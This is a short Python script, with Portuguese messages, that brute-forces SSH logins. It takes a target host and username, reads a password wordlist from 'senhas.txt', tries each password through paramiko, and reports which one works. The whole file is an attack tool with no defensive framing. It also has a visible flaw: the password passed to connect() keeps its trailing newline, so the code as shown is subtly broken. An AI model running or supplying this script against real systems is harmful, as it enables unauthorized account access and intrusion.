import paramiko
import sys

host = sys.argv[1]
port = 22
username = sys.argv[2]

with open ('senhas.txt', 'r', encoding='latin-1') as file:
    for password in file.readlines():
        print(password.strip())

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)


        try:
            ssh.connect(host, port, username, password)
            ssh.close()
            print('Senha valida: ' + password)
            break
        except:
            print('Senha invalida')